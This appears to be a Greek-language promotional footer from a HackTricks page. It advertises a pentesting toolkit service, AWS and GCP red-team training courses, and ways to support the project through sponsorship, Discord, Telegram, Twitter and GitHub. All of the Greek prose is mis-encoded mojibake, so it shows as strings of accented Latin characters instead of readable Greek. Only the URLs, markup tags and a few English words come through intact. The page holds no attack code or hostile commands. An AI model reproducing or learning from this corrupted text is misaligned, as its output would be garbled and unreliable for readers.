**Î†Î¼ÎµÏƒÎ± Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· Î³Î¹Î± Î±Î¾Î¹Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ & pentesting**. Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ Î¼Î¹Î± Ï€Î»Î®ÏÎ· pentest Î±Ï€ÏŒ Î¿Ï€Î¿Ï…Î´Î®Ï€Î¿Ï„Îµ Î¼Îµ 20+ ÎµÏÎ³Î±Î»ÎµÎ¯Î± & Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬ Ï€Î¿Ï… ÎºÏ…Î¼Î±Î¯Î½Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Î±Î½Î±Î³Î½ÏÏÎ¹ÏƒÎ· Î­Ï‰Ï‚ Î±Î½Î±Ï†Î¿ÏÎ¬. Î”ÎµÎ½ Î±Î½Ï„Î¹ÎºÎ±Î¸Î¹ÏƒÏ„Î¿ÏÎ¼Îµ Ï„Î¿Ï…Ï‚ pentesters - Î±Î½Î±Ï€Ï„ÏÏƒÏƒÎ¿Ï…Î¼Îµ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î±, Î¼Î¿Î½Î¬Î´ÎµÏ‚ Î±Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ·Ï‚ & ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ Î³Î¹Î± Î½Î± Ï„Î¿Ï…Ï‚ Î´ÏÏƒÎ¿Ï…Î¼Îµ Ï€Î¯ÏƒÏ‰ Î»Î¯Î³Î¿ Ï‡ÏÏŒÎ½Î¿ Î³Î¹Î± Î½Î± ÎµÎ¼Î²Î±Î¸ÏÎ½Î¿Ï…Î½, Î½Î± Î±Î½Î¿Î¯Î¾Î¿Ï…Î½ shells ÎºÎ±Î¹ Î½Î± Î´Î¹Î±ÏƒÎºÎµÎ´Î¬ÏƒÎ¿Ï…Î½.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
